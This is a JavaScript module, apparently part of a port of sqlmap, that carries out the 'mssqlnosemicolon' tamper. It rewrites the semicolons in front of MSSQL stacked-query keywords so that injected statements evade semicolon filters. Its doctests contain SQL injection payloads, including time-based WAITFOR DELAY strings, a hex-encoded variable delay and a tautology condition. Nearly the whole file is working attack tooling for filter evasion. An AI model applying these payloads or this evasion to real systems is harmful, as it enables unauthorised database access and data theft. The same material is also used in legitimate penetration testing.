// 对标 sqlmap mssqlnosemicolon.py：MSSQL 语句分号可省略
// ;WAITFOR -> ' WAITFOR'（堆叠注入去分号，绕过分号过滤）
export const mssqlnosemicolon = {
  name: 'mssqlnosemicolon',
  description: '将 MSSQL 堆叠语句前的分号替换为空格（;WAITFOR → WAITFOR，绕过分号过滤）',
  doctests: [
    { input: ";WAITFOR DELAY '0:0:5'--", output: " WAITFOR DELAY '0:0:5'--" },
    { input: ';DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x', output: ' DECLARE @x CHAR(9) SET @x=0x303a303a35 WAITFOR DELAY @x' },
    { input: "1' AND 'a'='a", output: "1' AND 'a'='a" }, // 无分号不动
  ],
  transform(payload) {
    const keywords = 'WAITFOR|DECLARE|SET|EXEC(?:UTE)?|SELECT|INSERT|UPDATE|DELETE|CREATE|DROP|ALTER|TRUNCATE|BEGIN|IF|WHILE|PRINT|USE|GRANT|REVOKE|BACKUP|RESTORE|RECONFIGURE|SHUTDOWN|WITH';
    return String(payload ?? '').replace(new RegExp(`;(?=\\s*(?:${keywords})\\b)`, 'gi'), ' ');
  },
};
export default mssqlnosemicolon;
